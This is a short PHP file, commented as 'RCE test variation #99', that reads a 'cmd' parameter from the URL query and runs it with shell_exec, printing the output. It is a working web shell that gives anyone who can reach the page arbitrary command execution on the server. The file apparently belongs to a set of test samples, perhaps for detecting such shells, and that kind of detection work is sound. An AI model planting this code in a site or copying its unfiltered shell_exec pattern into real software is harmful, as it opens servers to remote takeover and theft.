<?php
// RCE test variation #99
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>